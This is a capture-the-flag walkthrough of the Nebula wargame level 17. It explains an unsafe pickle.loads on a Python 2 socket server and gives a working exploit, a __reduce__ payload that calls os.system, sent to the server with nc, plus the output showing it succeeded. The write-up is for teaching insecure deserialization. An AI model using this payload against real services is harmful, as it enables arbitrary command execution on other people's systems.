## Challenge
There is a python script listening on port 10007 that contains a vulnerability.

## Solution
```python
#!/usr/bin/python

import os
import pickle
import time
import socket
import signal

signal.signal(signal.SIGCHLD, signal.SIG_IGN)

def server(skt):
  line = skt.recv(1024)

  obj = pickle.loads(line)

  for i in obj:
      clnt.send("why did you send me " + i + "?\n")

skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
skt.bind(('0.0.0.0', 10007))
skt.listen(10)

while True:
  clnt, addr = skt.accept()

  if(os.fork() == 0):
      clnt.send("Accepted connection from %s:%d" % (addr[0], addr[1]))
      server(clnt)
      exit(1)
```
* TCP Server listening at 10007
* Forks a new process for each client it serves
* Server reads 1024 bytes to `line`
* Unpickles `line` to Python object `obj`
  * Feels like our intervention point
* Iterates `obj`'s items and prints them

Nebula runs Python 2.
```
level17@nebula:/home/flag17$ python --version
Python 2.7.2+
```

In Python you can use `pickle` to serialize and unserialize Python objects.

[Python 2's `pickle` documentation](https://docs.python.org/2/library/pickle.html) warns:
> The pickle module is not secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.

After reading some more in the documentation I found the following:
```
object.__reduce__()

  When the Pickler encounters an object of a type it knows nothing about — such as an extension type — it looks in two places for a hint of how to pickle it.
  One alternative is for the object to implement a __reduce__() method.
  If provided, at pickling time __reduce__() will be called with no arguments, and it must return either a string or a tuple.

  ...

  When a tuple is returned, it must be between two and five elements long.
  Optional elements can either be omitted, or None can be provided as their value.
  The contents of this tuple are pickled as normal and used to reconstruct the object at unpickling time.
  
  The semantics of each element are:
  
  * A callable object that will be called to create the initial version of the object.
    The next element of the tuple will provide arguments for this callable,
    and later elements provide additional state information that will subsequently be used to fully reconstruct the pickled data.
    
    In the unpickling environment this object must be either a class, a callable registered as a “safe constructor” (see below),
    or it must have an attribute __safe_for_unpickling__ with a true value. Otherwise, an UnpicklingError will be raised in the unpickling environment.
    Note that as usual, the callable itself is pickled by name.

  * A tuple of arguments for the callable object.

  * Optionally, the object’s state, which will be passed to the object’s __setstate__() method as described in section Pickling and unpickling normal class instances.
    If the object has no __setstate__() method, then, as above, the value must be a dictionary and it will be added to the object’s __dict__.

  * Optionally, an iterator (and not a sequence) yielding successive list items.
    These list items will be pickled, and appended to the object using either obj.append(item) or obj.extend(list_of_items).
    This is primarily used for list subclasses, but may be used by other classes as long as they have append() and extend() methods with the appropriate signature.
    (Whether append() or extend() is used depends on which pickle protocol version is used as well as the number of items to append, so both must be supported.)

  * Optionally, an iterator (not a sequence) yielding successive dictionary items, which should be tuples of the form (key, value).
    These items will be pickled and stored to the object using obj[key] = value.
    This is primarily used for dictionary subclasses, but may be used by other classes as long as they implement __setitem__().
```
So basically if we want our special object to be pickled correctly we can implement a method called `__reduce()__`
* That method returns a tuple that describes how to handle the object
  * a callable object for unpickling, (e.g. a function)
  * arguments for the function

We can abuse this tuple to execute arbitrary commands.
* callable object - `os.system()`, it happens the server imports `os`, but this will work regardless
* arguments - command to execute

Let's write a Python script that constructs the evil pickled object.
```python
import pickle
import os

COMMAND = 'getflag > /home/flag17/exploit_output'

class PickleExploit(object):
    def __reduce__(self):
        return (os.system, (COMMAND,))

payload = pickle.dumps(PickleExploit())
print payload

```
We can then pipe the script's output (pickled object) to a socket connecting to the server.
```console
level17@nebula:~$ python pickle_exploit.py | nc 127.0.0.1 10007
Accepted connection from 127.0.0.1:53612^C
level17@nebula:~$ ls -la /home/flag17
total 14
drwxr-x--- 1 flag17 level17   80 2021-08-13 07:31 .
drwxr-xr-x 1 root   root      80 2012-08-27 07:18 ..
-rw-r--r-- 1 flag17 flag17   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag17 flag17  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag17 flag17    59 2021-08-13 08:34 exploit_output
-rw-r--r-- 1 root   root     520 2011-11-20 21:22 flag17.py
-rw-r--r-- 1 flag17 flag17   675 2011-05-18 02:54 .profile
level17@nebula:~$ cat /home/flag17/exploit_output
You have successfully executed getflag on a target account
```
